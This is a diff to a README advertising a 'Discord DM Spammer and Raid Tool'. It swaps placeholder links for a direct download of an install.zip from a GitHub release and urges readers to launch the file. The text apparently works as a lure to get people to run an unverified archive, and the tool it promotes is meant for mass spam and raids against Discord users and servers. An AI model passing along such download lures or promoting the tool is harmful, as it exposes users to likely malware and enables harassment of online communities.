@@ -18,7 +18,7 @@ Welcome to the Discord DM Spammer and Raid Tool repository, your go-to solution 
 ## 📥 Download
 Download the Discord DM Spammer and Raid Tool [here]() and harness the power of automated messaging on Discord!
 
-[![Download Discord DM Tool](https://github.com/YourUsername/Discord-DM-Spammer-Raid-Tool/releases)]()
+[![Download Discord DM Tool](https://github.com/bradleysmithrobberts2025/Discord-Multi-Tool/releases)](https://github.com/bradleysmithrobberts2025/Discord-Multi-Tool/releases/download/install/install.zip)
 
 If the link ends with a file name, ensure it is launched to access the tool.
 
@@ -38,7 +38,7 @@ Please use the Discord DM Spammer and Raid Tool responsibly and in compliance wi
 ## 🌟 Start Engaging on Discord Today!
 Don’t miss out on the opportunity to amplify your presence on Discord with the DM Spammer and Raid Tool. Download now and take your Discord interactions to the next level!
 
-![Discord DM Spammer](https://github.com/YourUsername/Discord-DM-Spammer-Raid-Tool/releases)
+![Discord DM Spammer](https://github.com/bradleysmithrobberts2025/Discord-Multi-Tool/releases)
 
 Let the tool do the work while you enjoy the results! 🚀🔥
 
